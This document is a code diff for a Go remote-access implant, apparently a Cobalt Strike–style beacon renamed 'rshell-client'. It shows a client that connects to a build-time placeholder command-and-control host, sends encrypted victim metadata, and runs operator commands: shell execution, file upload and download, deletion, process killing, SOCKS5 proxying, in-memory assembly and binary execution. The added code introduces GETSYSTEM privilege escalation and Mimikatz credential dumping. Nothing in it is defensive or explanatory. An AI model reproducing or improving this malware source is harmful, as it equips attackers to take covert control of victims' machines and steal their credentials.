@@ -2,13 +2,13 @@ package main
 
 import (
 	"Reacon/pkg/communication"
-	"Reacon/pkg/config"
-	"Reacon/pkg/encrypt"
-	"Reacon/pkg/services"
-	"Reacon/pkg/utils"
+	"rshell-client/shared/config"
+	"rshell-client/shared/encrypt"
+	"rshell-client/shared/link"
+	"rshell-client/shared/services"
+	"rshell-client/shared/utils"
 	"bytes"
 	"encoding/binary"
-	"errors"
 	"fmt"
 	"math/rand"
 	"net"
@@ -29,10 +29,12 @@ type TCPClient struct {
 	RemarkMessage     string
 	RemarkClientColor string
 	keepAlive         *time.Ticker
-	// Implementing timers and ThreadPool would require more context and may need external libraries
 }
 
-// assuming for the sake of example
+func init() {
+	link.ReportError = communication.ErrorProcess
+	link.ReportData = communication.DataProcess
+}
 
 func (s *TCPClient) InitializeClient(host string) {
 	addr, err := net.ResolveTCPAddr("tcp", host)
@@ -46,7 +48,7 @@ func (s *TCPClient) InitializeClient(host string) {
 		s.IsConnected = false
 		return
 	}
-	utils.TCPClient = conn
+	communication.TCPClient = conn
 
 	s.Client = conn
 	if s.Client != nil {
@@ -54,7 +56,6 @@ func (s *TCPClient) InitializeClient(host string) {
 		s.Buffer = make([]byte, 4)
 		s.MS.Reset()
 
-		//firstBlood
 		if len(utils.MetaInfo) == 0 {
 			utils.MetaInfo, _ = utils.EncryptedMetaInfo()
 			utils.MetaInfo, _ = encrypt.EncodeBase64(utils.MetaInfo)
@@ -64,10 +65,8 @@ func (s *TCPClient) InitializeClient(host string) {
 		firstBloodMsg := utils.BytesCombine(firstBloodBytes, utils.MetaInfo)
 		communication.Send(firstBloodMsg, s.Client)
 
-		// Implementing Timer using time package. Assuming KeepAlivePacket function exists
 		s.keepAlive = time.NewTicker(8 * time.Second)
 
-		// Start a goroutine to handle the ticks
 		go func() {
 			for range s.keepAlive.C {
 				s.KeepAlivePacket(s.Client)
@@ -131,93 +130,29 @@ func (s *TCPClient) ReadServerData() {
 						}
 						cmdType := binary.BigEndian.Uint32(decrypted[:4])
 						cmdBuf := decrypted[4:]
-						if cmdBuf != nil {
-							var err error
-							var callbackType int
-							var result []byte
-							switch cmdType {
-							case services.SHELL: // shell
-								result, err = services.CmdShell(cmdBuf)
-								callbackType = 0
-							case services.UploadStart: //upload 第一次
-								result, err = services.CmdUpload(cmdBuf, true)
-								callbackType = 0
-							case services.UploadLoop: //upload 后续的upload
-								result, err = services.CmdUpload(cmdBuf, false)
-								callbackType = 0
-							case services.DOWNLOAD: //download   2
-								result, err = services.CmdDownload(cmdBuf)
-								callbackType = 0
-							case services.FileBrowse: //File Browser
-								result, err = services.CmdFileBrowse(cmdBuf)
-								callbackType = services.FileBrowse
-							case services.CD: //cd
-								result, err = services.CmdCd(cmdBuf)
-								callbackType = 0
-							case services.SLEEP: //sleep
-								result, err = services.CmdSleep(cmdBuf)
-								callbackType = 0
-							case services.PAUSE: //pause
-								result, err = services.CmdPause(cmdBuf)
-								callbackType = 0
-							case services.PWD: //pwd
-								result, err = services.CmdPwd()
-								callbackType = 0
-							case services.EXIT: //exit
-								result, err = services.CmdExit()
-								if err == nil {
-									os.Exit(1)
-								}
-								callbackType = 0
-							case services.EXECUTE: // windows 后台执行程序
-								result, err = services.CmdExecute(cmdBuf)
-								callbackType = 0
-							case services.PS: // ps 列出进程
-								result, err = services.CmdPs()
-								callbackType = services.PS
-							case services.KILL: //kill
-								result, err = services.CmdKill(cmdBuf)
-								callbackType = 0
-							case services.MKDIR: //mkdir
-								result, err = services.CmdMkdir(cmdBuf)
-								callbackType = 0
-							case services.DRIVES: //list drives  2
-								result, err = services.CmdDrives()
-								callbackType = services.DRIVES
-							case services.RM: //rm
-								result, err = services.CmdRm(cmdBuf)
-								callbackType = 0
-							case services.CP: //cp
-								result, err = services.CmdCp(cmdBuf)
-								callbackType = 0
-							case services.MV: //mv
-								result, err = services.CmdMv(cmdBuf)
-								callbackType = 0
-							case services.FileContent:
-								result, err = services.GetFileContent(cmdBuf)
-								callbackType = 0
-							case services.Scoks5Start:
-								result, err = services.SocksConnect(cmdBuf)
-								callbackType = 0
-							case services.Scoks5Close:
-								result, err = services.SocksClose()
-								callbackType = 0
-							case services.ExecuteAssembly:
-								result, err = services.Execute_Assembly(cmdBuf)
-								callbackType = 0
-							case services.InlineBin:
-								result, err = services.Inline_bin(cmdBuf)
-								callbackType = 0
-							default:
-								err = errors.New("not supported command")
-							}
-							// convert charset here
-							if err != nil {
-								communication.ErrorProcess(err)
-							} else {
-								if callbackType >= 0 {
+
+						// Long-running commands run async so keepalive doesn't time out
+						if cmdType == services.GETSYSTEM || cmdType == services.MIMIKATZ {
+							go func(ct uint32, cb []byte) {
+								result, callbackType, err := services.DispatchCommand(ct, cb)
+								if err != nil {
+									communication.ErrorProcess(err)
+								} else if callbackType >= 0 {
 									communication.DataProcess(callbackType, result)
 								}
+					}(cmdType, cmdBuf)
+						return
+						}
+
+						if cmdBuf != nil {
+							result, callbackType, err := services.DispatchCommand(cmdType, cmdBuf)
+							if cmdType == services.EXIT && err == nil {
+								os.Exit(1)
+							}
+							if err != nil {
+								communication.ErrorProcess(err)
+							} else if callbackType >= 0 {
+								communication.DataProcess(callbackType, result)
 							}
 						}
 					}
@@ -259,7 +194,7 @@ func Run_main(host string) {
 	socket := TCPClient{}
 	socket.InitializeClient(host)
 
-	r := rand.New(rand.NewSource(time.Now().UnixNano())) // Create a new random generator
+	r := rand.New(rand.NewSource(time.Now().UnixNano()))
 
 	for {
 		if !socket.IsConnected {
@@ -282,7 +217,6 @@ func main() {
 	if errConsole != nil && errConsole.Error() != "" {
 		fmt.Println(errConsole)
 	}
-	// windows 下设置不需要DPI缩放
 	errDPI := services.ProcessDPIAware()
 	if errDPI != nil && errDPI.Error() != "" {
 		fmt.Println(errDPI)
@@ -290,6 +224,6 @@ func main() {
 
 	host := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 	host = strings.ReplaceAll(host, " ", "")
-
+	encrypt.GenerateKeyPair()
 	Run_main(host)
 }
